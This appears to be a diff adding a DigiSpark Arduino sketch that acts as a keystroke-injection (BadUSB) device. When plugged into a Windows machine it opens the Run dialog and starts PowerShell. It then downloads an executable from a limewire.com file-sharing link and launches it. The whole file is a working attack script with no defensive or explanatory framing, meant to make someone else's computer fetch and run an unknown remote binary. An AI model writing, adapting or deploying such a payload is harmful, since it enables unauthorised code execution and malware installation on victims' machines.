@@ -1,0 +1,19 @@
+#include <DigiKeyboard.h>
+
+void setup() {
+  DigiKeyboard.delay(1000);
+  
+  // Open the Run dialog (Win + R)
+  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT); 
+  DigiKeyboard.sendKeyPress('r'); 
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Invoke-WebRequest -Uri 'https://limewire.com/d/fe2510d6-1776-438d-a691-dbf01356e403#WFoXNzZf3z4gCZ0CO7rcaU95si2pMhONR30J6g982zw' -OutFile 'D:\\yourfile.exe'");
+  DigiKeyboard.delay(1000);    
+  DigiKeyboard.println("Start-Process 'D:\\yourfile.exe'");
+  DigiKeyboard.delay(100);
+}
+
+void loop() {
+}
